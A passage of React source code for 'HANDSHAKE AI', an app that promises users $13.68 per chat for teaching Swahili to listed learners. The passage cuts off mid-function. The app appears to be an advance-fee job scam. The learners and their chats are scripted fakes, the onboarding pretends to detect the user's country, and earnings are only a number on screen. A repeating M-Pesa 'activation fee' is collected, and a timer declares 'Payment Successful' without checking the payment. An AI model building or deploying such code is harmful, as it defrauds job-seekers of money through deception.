import React, { createContext, useContext, useEffect, useRef, useState } from 'react';
import ReactDOM from 'react-dom/client';
import {
  LayoutGrid, DollarSign, User, CheckCircle, Globe, MessageSquare, Lock,
  Star, Unlock, Smartphone, XCircle, ArrowLeft, Send, CheckSquare,
  Clock, TrendingUp, Wallet, CreditCard, Bitcoin, Lightbulb, Award,
  Pencil, ShieldCheck
} from 'lucide-react';

/* ═══════════════════ DATA ═══════════════════ */
const LEARNERS = {
  10: { name: 'John Smith', ini: 'JS', col: '#3f51b5', country: 'USA', level: 'Beginner', bio: 'I want to learn Swahili for my trip to Tanzania.', tags: ['Travel', 'Culture', 'Food'] },
  11: { name: 'Emma Wilson', ini: 'EW', col: '#009688', country: 'UK', level: 'Beginner', bio: 'Interested in East African culture and languages.', tags: ['Culture', 'History', 'Music'] },
  12: { name: 'Michael Brown', ini: 'MB', col: '#e91e63', country: 'Canada', level: 'Intermediate', bio: 'Planning to work in Kenya, need to improve my Swahili.', tags: ['Business', 'Travel', 'Sports'] },
  13: { name: 'Sarah Johnson', ini: 'SJ', col: '#ff9800', country: 'Australia', level: 'Beginner', bio: 'Moving to Tanzania for a teaching job.', tags: ['Education', 'Travel', 'Culture'] },
  14: { name: 'David Martinez', ini: 'DM', col: '#9c27b0', country: 'Spain', level: 'Intermediate', bio: 'Learning Swahili to connect with my Kenyan friends.', tags: ['Culture', 'Sports', 'Music'] },
  15: { name: 'Lisa Chen', ini: 'LC', col: '#ec4899', country: 'Singapore', level: 'Beginner', bio: 'Planning a safari adventure in East Africa.', tags: ['Travel', 'Wildlife', 'Photography'] }
};
const CHAT_SCRIPTS = {
  10: ["Hello! I'm excited to start learning Swahili!", "Can you teach me how to greet someone?", "What does 'Habari' mean?"],
  11: ["Hi there! I love East African culture.", "How do you say 'thank you' in Swahili?", "What are some common phrases?"],
  12: ["Good morning! I need to practice business Swahili.", "How would I say 'meeting' in Swahili?", "How do I introduce myself professionally?"],
  13: ["Hi! I'm moving to Tanzania soon.", "How do I say 'where is the school'?", "Can you help me with numbers?"],
  14: ["Hola! My Kenyan friends say I should learn Swahili.", "What's the word for 'friend'?", "Can we practice a conversation?"],
  15: ["Hello! I'm going on safari soon.", "How do I say 'lion' and 'elephant' in Swahili?", "What phrases are useful on safari?"]
};
const REPLIES = [
  "Asante sana! That means 'thank you very much'.",
  "Nzuri! You're doing great — 'nzuri' means good.",
  "Karibu sana! You're really getting it!",
  "Sawa sawa! That means 'okay okay' — you're learning fast!",
  "Exactly! Swahili isn't that hard once you start."
];

/* ═══════════════════ CONTEXT ═══════════════════ */
const AppContext = createContext(null);
const useApp = () => useContext(AppContext);

function AppProvider({ children }) {
  const [view, setView] = useState('dashboard');
  const [activated, setActivated] = useState(false);
  const [verified, setVerified] = useState(false);
  const [balance, setBalance] = useState(0);
  const [totalEarned, setTotalEarned] = useState(0);
  const [tasksDone, setTasksDone] = useState(0);
  const [ledger, setLedger] = useState([]);
  const [profile, setProfile] = useState({ fullname: 'Guest User', email: '', phone: '' });
  const [activeLearner, setActiveLearner] = useState(null);
  const [activeCount, setActiveCount] = useState(0);
  const [actModalOpen, setActModalOpen] = useState(false);
  const [stkState, setStkState] = useState(null);
  const [stkPhone, setStkPhone] = useState('');
  const [editModalOpen, setEditModalOpen] = useState(false);
  const [mobDrawerOpen, setMobDrawerOpen] = useState(false);

  const endChat = () => {
    setTasksDone(t => t + 1);
    setBalance(b => b + 13.68);
    setTotalEarned(t => t + 13.68);
    const now = new Date();
    setLedger(l => [{ date: now.toLocaleDateString(), method: 'Chat Session', amount: '$13.68', status: 'Completed' }, ...l]);
    setActiveCount(c => Math.max(0, c - 1));
    setView('earnings');
  };
  const activateChats = () => { setActivated(true); setVerified(true); };

  return (
    <AppContext.Provider value={{
      view, setView, activated, setActivated, verified, setVerified,
      balance, setBalance, totalEarned, setTotalEarned, tasksDone, setTasksDone,
      ledger, setLedger, profile, setProfile, activeLearner, setActiveLearner,
      activeCount, setActiveCount, actModalOpen, setActModalOpen,
      stkState, setStkState, stkPhone, setStkPhone,
      editModalOpen, setEditModalOpen, mobDrawerOpen, setMobDrawerOpen,
      endChat, activateChats
    }}>
      {children}
    </AppContext.Provider>
  );
}

/* ═══════════════════ ONBOARDING ═══════════════════ */
const OB_STEPS = [
  { icon: '🌍', label: 'Detecting your country...' },
  { icon: '📡', label: 'Analyzing location data...' },
  { icon: '🌐', label: 'Connecting to East Africa servers...' },
  { icon: '💰', label: 'Loading payment methods...' },
  { icon: '📱', label: 'Verifying M-Pesa integration...' },
  { icon: '✦', label: 'Finalizing setup...' }
];
function Onboarding({ onDone }) {
  const [step, setStep] = useState(0);
  const [done, setDone] = useState(false);
  useEffect(() => {
    if (step >= OB_STEPS.length) { const t = setTimeout(() => setDone(true), 500); return () => clearTimeout(t); }
    const t = setTimeout(() => setStep(s => s + 1), 620);
    return () => clearTimeout(t);
  }, [step]);
  return (
    <div className="ob-overlay">
      <div className="ob-card" style={{ display: done ? 'none' : 'block' }}>
        <h2 style={{ fontSize: 'clamp(1.35rem,5vw,1.7rem)', marginBottom: 4, textAlign: 'center' }}>Welcome to HANDSHAKE AI</h2>
        <p style={{ color: '#64748b', fontSize: '.86rem', marginBottom: 16, textAlign: 'center' }}>Kenya • Tanzania • Uganda</p>
        <div className="ob-status" style={{ visibility: step >= OB_STEPS.length ? 'visible' : 'hidden' }}>
          <CheckCircle size={15} style={{ color: '#10b981' }} /><span>KE Kenya detected and supported!</span>
        </div>
        <div className="ob-steps">
          {OB_STEPS.map((s, i) => {
            const isDone = i < step, isActive = i === step;
            return (
              <div key={i} className={`ob-step ${isDone ? 'done' : ''} ${isActive ? 'active' : ''}`}>
                <span>{s.icon}</span><span style={{ flexGrow: 1 }}>{s.label}</span>
                {isDone && <CheckCircle size={14} style={{ color: 'var(--green)' }} />}
                {isActive && <div className="spin" />}
              </div>
            );
          })}
        </div>
        <div className="ob-prog"><div className="ob-prog-bar" style={{ width: `${(step / OB_STEPS.length) * 100}%` }} /></div>
      </div>
      <div className="ob-card" style={{ display: done ? 'block' : 'none', textAlign: 'center' }}>
        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 13 }}>
          <div className="globe-circle"><Globe size={28} style={{ color: '#fff' }} /></div>
          <span className="globe-badge">East Africa</span>
        </div>
        <h2 style={{ fontSize: 'clamp(1.35rem,5vw,1.7rem)', marginBottom: 4 }}>Welcome to HANDSHAKE AI</h2>
        <p style={{ color: '#64748b', fontSize: '.86rem', marginBottom: 18 }}>Kenya • Tanzania • Uganda</p>
        <div className="sbox">
          <CheckCircle size={21} style={{ color: '#10b981', flexShrink: 0 }} />
          <div style={{ textAlign: 'left' }}>
            <div style={{ color: '#065f46', fontSize: '.9rem', fontWeight: 700 }}>KE Kenya Detected!</div>
            <div style={{ color: '#047857', fontSize: '.8rem' }}>Your country is fully supported</div>
          </div>
        </div>
        <button className="ob-btn" onClick={onDone}>Continue to Dashboard →</button>
      </div>
    </div>
  );
}

/* ═══════════════════ HEADER ═══════════════════ */
function Header() {
  const { view, setView, setMobDrawerOpen } = useApp();
  return (
    <header className="app-header">
      <div className="logo">HANDSHAKE<span className="logo-ai">AI</span><span className="logo-ke">KE</span></div>
      <nav>
        <a className={view === 'dashboard' ? 'active' : ''} onClick={e => { e.preventDefault(); setView('dashboard'); }}><LayoutGrid size={16} /><span className="nav-txt">Dashboard</span></a>
        <a className={view === 'earnings' ? 'active' : ''} onClick={e => { e.preventDefault(); setView('earnings'); }}><DollarSign size={16} /><span className="nav-txt">Earnings</span></a>
        <a className={view === 'profile' ? 'active' : ''} onClick={e => { e.preventDefault(); setView('profile'); }}><User size={16} /><span className="nav-txt">Profile</span></a>
      </nav>
      <div className="profile-section">
        <button className="ham-btn" onClick={() => setMobDrawerOpen(true)} aria-label="Menu"><span /><span /><span /></button>
      </div>
    </header>
  );
}

/* ═══════════════════ MOBILE DRAWER ═══════════════════ */
function MobileDrawer() {
  const { mobDrawerOpen, setMobDrawerOpen, view, setView, profile } = useApp();
  const close = () => setMobDrawerOpen(false);
  const go = v => { setView(v); close(); };
  return (
    <>
      <div className={`mob-drawer-overlay ${mobDrawerOpen ? 'open' : ''}`} onClick={close} />
      <div className={`mob-drawer ${mobDrawerOpen ? 'open' : ''}`}>
        <div className="mob-drawer-head">
          <div className="mob-drawer-logo">HANDSHAKE<span className="logo-ai" style={{ marginLeft: 4 }}>AI</span><span className="logo-ke" style={{ marginLeft: 3 }}>KE</span></div>
          <button className="mob-drawer-close" onClick={close}>✕</button>
        </div>
        <div className="mob-nav">
          <a className={view === 'dashboard' ? 'active' : ''} onClick={e => { e.preventDefault(); go('dashboard'); }}><LayoutGrid size={18} /> Dashboard</a>
          <a className={view === 'earnings' ? 'active' : ''} onClick={e => { e.preventDefault(); go('earnings'); }}><DollarSign size={18} /> Earnings</a>
          <a className={view === 'profile' ? 'active' : ''} onClick={e => { e.preventDefault(); go('profile'); }}><User size={18} /> Profile</a>
        </div>
        <div className="mob-user-bar">
          <div className="mob-user-av">{(profile.fullname || 'U').charAt(0).toUpperCase()}</div>
          <div className="mob-user-info">
            <div className="mob-uname">{profile.fullname || 'User'}</div>
            <div className="mob-uemail">{profile.email || '-'}</div>
          </div>
        </div>
      </div>
    </>
  );
}

/* ═══════════════════ DASHBOARD ═══════════════════ */
function Dashboard() {
  const { activated, setActModalOpen, setActiveLearner, setView, activeCount, setActiveCount } = useApp();
  const openChat = id => { setActiveLearner(id); setActiveCount(c => Math.min(c + 1, 6)); setView('chat'); };
  const onLearnerClick = id => { if (!activated) setActModalOpen(true); else openChat(id); };
  return (
    <div className="dash-wrap">
      <h1 className="dash-title">Online Learners</h1>
      <p className="dash-sub">Connect with people who want to learn Swahili. Earn $13.68 per chat session.</p>
      <div className="stats-strip">
        <div className="stats-left">
          <div className="stat-item" style={{ color: 'var(--blue)' }}><MessageSquare size={15} /><span>Active Chats: <b>{activeCount}/6</b></span></div>
          <div className="stat-item" style={{ color: 'var(--green)' }}><DollarSign size={15} /><span>Per chat: <b>$13.68</b></span></div>
        </div>
        {!activated && (
          <button onClick={() => setActModalOpen(true)} className="gbtn" style={{ background: '#e65100', padding: '9px 13px', fontSize: '.83rem', whiteSpace: 'nowrap' }}>Activate Chat Access</button>
        )}
      </div>
      {!activated && (
        <div className="warn-banner">
          <div className="warn-title"><Lock size={16} style={{ color: '#ca8a04' }} /> Chat Activation Required</div>
          <div className="warn-text">Pay a small activation fee to start chatting and earning. This fee is required for each chat session.</div>
        </div>
      )}
      <div className="learn-grid">
        {Object.keys(LEARNERS).map(id => {
          const l = LEARNERS[id], key = Number(id);
          return (
            <div className="learn-card" key={id}>
              <div className="learn-head">
                <div className="avatar" style={{ background: l.col }}>{l.ini}<span className="dot" /></div>
                <div>
                  <div className="learn-name">{l.name}</div>
                  <span className="learn-country"><Globe size={12} />{l.country}</span>
                </div>
              </div>
              <span className={`lvl ${l.level === 'Beginner' ? 'lvl-b' : 'lvl-i'}`}><Star size={10} />{l.level}</span>
              <p className="learn-bio">{l.bio}</p>
              <div className="tags">{l.tags.map(t => <span className="tag" key={t}>{t}</span>)}</div>
              <button onClick={() => onLearnerClick(key)} className={`lock-btn ${activated ? 'open' : ''}`}>
                {activated ? <><Unlock size={14} /> Start Chat</> : <><Lock size={14} /> Locked</>}
              </button>
            </div>
          );
        })}
      </div>
    </div>
  );
}

/* ═══════════════════ ACTIVATION MODAL (Paylor) ═══════════════════ */
function ActivationModal() {
  const { actModalOpen, setActModalOpen, setStkState, setStkPhone } = useApp();
  const [phone, setPhone] = useState('');
  const [phoneErr, setPhoneErr] = useState('');
  const [alert, setAlert] = useState(null);
  const [loading, setLoading] = useState(false);
  const PRICE_KES = 180;

  const normalize = raw => {
    let p = raw.replace(/\D/g, '');
    if (p.startsWith('0')) p = '254' + p.slice(1);
    if (p.length === 9 && (p.startsWith('7') || p.startsWith('1'))) p = '254' + p;
    if (p.length === 10 && (p.startsWith('07') || p.startsWith('01'))) p = '254' + p.slice(1);
    if (!p.startsWith('254')) p = '254' + p;
    return p;
  };

  const close = () => { setActModalOpen(false); setPhone(''); setPhoneErr(''); setAlert(null); setLoading(false); };

  const initSTK = async () => {
    setAlert(null);
    if (!phone.trim()) { setPhoneErr('Please enter your M-Pesa number'); return; }
    const norm = normalize(phone);
    if (!/^254[17]\d{8}$/.test(norm)) { setPhoneErr('Please enter a valid M-Pesa number'); return; }
    setPhoneErr(''); setLoading(true);
    try {
      const reference = `HS_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
      const resp = await fetch('/api/stk-push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: norm, amount: PRICE_KES, reference, description: 'HANDSHAKE AI - Chat Activation Fee' })
      });
      const data = await resp.json();
      if (!resp.ok) throw new Error(data.error || data.message || 'STK push failed');
      if (data?.transactionId || data?.status === 'SENT' || data?.success) {
        setStkPhone(norm); close(); setStkState('waiting');
        setTimeout(() => setStkState('success'), 4000);
      } else {
        setAlert({ type: 'error', msg: data?.message || 'STK push failed. Try again.' }); setLoading(false);
      }
    } catch (err) {
      setAlert({ type: 'error', msg: err.message || 'Network error. Try again.' }); setLoading(false);
    }
  };

  if (!actModalOpen) return null;
  return (
    <div className="modal-ov open">
      <div className="modal-box">
        <div className="modal-ico-dollar">$</div>
        <h2 className="modal-title">Activate Chat Access</h2>
        <p className="modal-desc">Pay activation fee to start chatting and earning $13.68 per chat session</p>
        <div className="modal-fee">
          <span className="mf-lbl">Activation Fee:</span>
          <div><span className="mf-usd">$1.40 USD</span><span className="mf-kes">≈ KES {PRICE_KES}</span></div>
        </div>
        <div className="mig">
          <label>M-Pesa Phone Number</label>
          <input type="tel" value={phone} onChange={e => setPhone(e.target.value)} placeholder="0712345678 or 254712345678" inputMode="numeric" />
          {phoneErr && <div className="mig-error" style={{ display: 'block' }}>{phoneErr}</div>}
        </div>
        {alert && <div className={`alert alert-${alert.type}`} style={{ display: 'block' }}>{alert.msg}</div>}
        <div className="modal-btns">
          <button onClick={close} className="mbtn mbtn-cancel">Cancel</button>
          <button onClick={initSTK} className="mbtn mbtn-pay" disabled={loading}>{loading ? 'Sending...' : `Pay KES ${PRICE_KES}`}</button>
        </div>
        <p className="modal-disc">You will receive an M-Pesa STK push on your phone. Enter your PIN to complete payment.</p>
      </div>
    </div>
  );
}

/* ═══════════════════ STK OVERLAY ═══════════════════ */
function StkOverlay() {
  const { stkState, setStkState, stkPhone, activateChats } = useApp();
  if (!stkState) return null;
  const close = () => setStkState(null);
  const onSuccess = () => { activateChats(); setStkState(null); };
  return (
    <div className="stk-ov open">
      <div className="stk-card">
        {stkState === 'sending' && (<>
          <div className="stk-spinner" />
          <div className="stk-title">Sending STK Push...</div>
          <div className="stk-desc">Connecting to M-Pesa. Please wait.</div>
        </>)}
        {stkState === 'waiting' && (<>
          <div className="stk-phone-ico"><Smartphone size={26} style={{ color: 'var(--green)' }} /></div>
          <div className="stk-title">Check Your Phone</div>
          <div className="stk-desc">An M-Pesa prompt has been sent to <b>{stkPhone.replace(/^254/, '0')}</b>.<br />Enter your PIN to pay <b>KES 180</b>.</div>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6, fontSize: '.82rem', color: 'var(--tm)', marginBottom: 6 }}>
            <div className="spin" /> Waiting for payment confirmation...
          </div>
          <button className="stk-cancel-link" onClick={close}>Cancel</button>
        </>)}
        {stkState === 'success' && (<>
          <div className="stk-success-ico"><CheckCircle size={28} style={{ color: 'var(--green)' }} /></div>
          <div className="stk-title">Payment Successful!</div>
          <div className="stk-desc">KES 180 received. Your chat access is now active. Start chatting and earning!</div>
          <button className="stk-retry-btn" onClick={onSuccess}>Start Chatting →</button>
        </>)}
        {stkState === 'fail' && (<>
          <div className="stk-fail-ico"><XCircle size={28} style={{ color: 'var(--red)' }} /></div>
          <div className="stk-title">Payment Failed</div>
          <div className="stk-desc">The payment was not completed. Please try again.</div>
          <button className="stk-retry-btn" onClick={close}>Try Again</button>
          <button className="stk-cancel-link" onClick={close}>Cancel</button>
        </>)}
      </div>
    </div>
  );
}

/* ═══════════════════ CHAT ═══════════════════ */
function Chat() {
  const { activeLearner, setView, endChat } = useApp();
  const [messages, setMessages] = useState([]);
  const [input, setInput] = useState('');
  const chatIdx = useRef(0);
  const intervalRef = useRef(null);
  const msgsRef = useRef(null);
  const learner = LEARNERS[activeLearner];

  const pushMsg = (text, who) => {
    const now = new Date();
    const time = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}`;
    setMessages(m => [...m, { text, who, time }]);
    setTimeout(() => { if (msgsRef.current) msgsRef.current.scrollTop = msgsRef.current.scrollHeight; }, 50);
  };

  useEffect(() => {
    if (!learner) return;
    setMessages([]); chatIdx.current = 0;
    const scripts = CHAT_SCRIPTS[activeLearner] || CHAT_SCRIPTS[10];
    const t = setTimeout(() => { pushMsg(scripts[0]
